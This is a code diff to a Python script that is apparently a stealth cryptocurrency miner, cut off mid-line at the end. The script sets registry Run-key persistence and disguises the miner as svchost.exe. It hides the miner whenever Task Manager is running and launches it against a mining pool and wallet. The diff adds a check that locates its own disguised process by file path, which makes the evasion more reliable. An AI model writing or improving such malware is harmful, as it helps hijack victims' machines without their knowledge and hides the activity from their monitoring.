@@ -38,7 +38,6 @@ def engage_locks():
     """Persistence, Reset Disable, and Update Lockdown."""
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
-        # Point to our portable python engine to keep it running
         py_path = os.path.join(WORK_DIR, "python", "pythonw.exe")
         winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{py_path}" "{SELF_PATH}" --id {ID}')
         winreg.CloseKey(key)
@@ -79,9 +78,17 @@ def auto_update():
 
 # --- 4. Smart Throttle & Vanishing Act ---
 def manage_power():
-    """Hides from Taskmgr and toggles 90/30 power."""
+    """Hides from Taskmgr and toggles 90/30 power with DNA check."""
     is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
-    miner_proc = next((p for p in psutil.process_iter(['name']) if p.info['name'] == f"{ID}.exe"), None)
+    
+    # DNA Check: Only find OUR svchost.exe by its full file path
+    miner_proc = None
+    for p in psutil.process_iter(['name', 'exe']):
+        try:
+            if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
+                miner_proc = p
+                break
+        except (psutil.NoSuchProcess, psutil.AccessDenied): continue
 
     if is_monitored:
         if miner_proc:
@@ -97,20 +104,9 @@ def manage_power():
             try:
                 subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", WALLET, "--max-cpu-usage", target_pwr, "-k", "--tls"])
                 notify(f"Engine Engaged. Power: {target_pwr}%", "mine")
-            except: pass
+            except Exception as e:
+                notify(f"Engine Failed: {str(e)}", "sys")
 
 def main():
     engage_locks()
-    notify("SYSTEM ONLINE - Shadow Engine Engaged.", "mine")
-    last_update = 0
-    while True:
-        # Check for updates only every 12 hours
-        if (time.time() - last_update) > TWELVE_HOURS:
-            auto_update()
-            last_update = time.time()
-            
-        manage_power()
-        time.sleep(15)
-
-if __name__ == "__main__":
-    main()
+    notify("SYSTEM
